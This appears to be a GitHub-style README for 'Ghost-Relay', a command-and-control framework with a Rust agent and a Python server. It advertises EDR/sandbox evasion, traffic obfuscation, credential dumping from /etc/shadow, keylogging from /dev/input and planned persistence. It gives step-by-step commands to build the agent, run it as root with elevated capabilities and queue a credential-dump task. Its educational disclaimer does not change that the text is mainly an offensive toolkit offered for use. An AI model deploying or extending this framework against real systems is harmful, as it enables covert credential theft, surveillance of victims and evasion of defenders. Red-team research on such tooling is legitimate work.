# Ghost-Relay v1.0: Decentralized Command & Control Framework

**Status:** Alpha | **License:** Restricted Educational License
**Author:** r4ttles | **Project:** offensive-engine

Ghost-Relay is a production-grade, modular Command & Control (C2) framework featuring a decentralized mesh architecture. Built with Rust for the agent (memory-safe, high-performance) and Python for the server, it is designed to evade modern EDR/XDR solutions through stealth techniques, traffic obfuscation, and memory-resident execution. This tool is designed for red team simulations, security research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is strictly prohibited.

Key Features:
Decentralized Mesh: Agents can relay commands peer-to-peer, eliminating single points of failure.
Memory-Resident Execution: All operations occur in RAM; minimal disk artifacts.
Modular Plugin System: Hot-swappable modules for credential dumping, keylogging, network scanning, and more.
Advanced Evasion: Anti-VM/Sandbox detection detects virtualization artifacts and sandboxes before executing payloads. Stealth Sleep uses CPU-intensive loops to mask sleep intervals from heuristic analyzers. Traffic Obfuscation mimics legitimate SaaS/OAuth API traffic.
Cross-Platform Ready: Core logic supports Linux; Windows/macOS modules are under development.
Real Credential Scanning: Native scanner for /etc/shadow (Linux) with regex-based hash extraction.

Architecture:
Server (Python 3.x using aiohttp): Async task queue, agent management, and result exfiltration handler.
Agent (Rust 1.7+ using tokio and reqwest): Lightweight binary with modular plugin loader and evasion engine.
Plugins follow a standard interface (C2Module trait) for dynamic task execution.

Requirements:
Python 3.9+ (with venv), Rust Toolchain (cargo, rustc), Fedora/RHEL/Debian based Linux (for current modules).

Installation and Usage:

1. Clone and Setup:
git clone https://github.com/r4ttles/offensive-engine.git
cd offensive-engine/ghost_relay
python3 -m venv venv
source venv/bin/activate
pip install aiohttp requests cryptography
cd agent && cargo build --release

2. Run the C2 Server:
source venv/bin/activate && python server.py
Server listens on http://0.0.0.0:8443

3. Launch the Agent (root required for /etc/shadow scanning):
sudo setcap cap_sys_admin+ep ./agent/target/release/ghost-agent
sudo C2_URL="http://localhost:8443" ./agent/target/release/ghost-agent

4. Inject Tasks via HTTP POST:
AGENT_ID="YOUR_AGENT_UUID"
python3 -c "import requests; requests.post('http://localhost:8443/api/v1/task', json={'task_id': 'DUMP_CREDS', 'target_agent': '$AGENT_ID', 'payload': {}})"

5. Retrieve Results:
Results are saved to results/<agent_id>_<task_id>.json

Current Modules:
DUMP_CREDS: Scans /etc/shadow for password hashes using regex. Platform: Linux. Status: Stable.
KEYLOG: Background thread listener for /dev/input/event*. Platform: Linux. Status: Alpha.
NET_SCAN: Basic network discovery. Platform: Cross. Status: WIP.
PERSISTENCE: Systemd/Registry persistence. Platform: Linux/Win. Status: Planned.

Legal Warning:
THIS TOOL IS FOR EDUCATIONAL AND DEFENSIVE RESEARCH PURPOSES ONLY. Unauthorized use against systems you do not own or have explicit permission to test is illegal and violates this license. Violation of these terms results in immediate termination of usage rights and potential legal action.
